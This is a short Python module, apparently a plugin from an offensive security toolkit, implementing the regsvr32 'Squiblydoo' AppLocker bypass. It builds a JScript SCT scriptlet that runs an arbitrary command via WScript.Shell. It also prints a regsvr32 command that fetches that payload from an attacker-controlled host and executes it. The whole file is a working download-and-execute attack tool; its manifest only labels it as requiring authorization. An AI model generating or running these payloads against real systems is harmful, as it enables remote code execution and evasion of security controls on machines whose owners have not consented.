"""regsvr32.exe LOLBin — SCT script execution, AppLocker bypass."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.regsvr32.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1218.010"],
}


def _generate_sct(command: str) -> str:
    return '''<?XML version="1.0"?>
<scriptlet>
<registration progid="TESTING" classid="{{00000000-0000-0000-0000-000000000000}}">
<script language="JScript">
<![CDATA[
  var r = new ActiveXObject("WScript.Shell").Run("{cmd}");
]]>
</script>
</registration>
</scriptlet>'''.format(cmd=command.replace('"', '\\"'))


def run(args: Any) -> int:
    lhost = getattr(args, "lhost", None)
    lport = getattr(args, "lport", "8080")
    command = getattr(args, "command", "calc.exe")
    generate_sct = getattr(args, "generate_sct", False)

    if generate_sct:
        sct = _generate_sct(command)
        print("[*] Generated SCT payload:")
        print(sct)
        print("\n[*] Host this file and use:")
        print('  regsvr32.exe /s /n /u /i:http://{lhost}:{lport}/payload.sct scrobj.dll'.format(
            lhost=lhost or "<LHOST>", lport=lport))
        return 0

    cmd = 'regsvr32.exe /s /n /u /i:http://{lhost}:{lport}/payload.sct scrobj.dll'.format(
        lhost=lhost or "<LHOST>", lport=lport)

    print("[*] regsvr32.exe LOLBin (Squiblydoo):")
    print(f"  {cmd}")
    print("\n[*] Use --generate-sct to create the SCT payload")
    print("[*] This bypasses AppLocker default rules")
    return 0
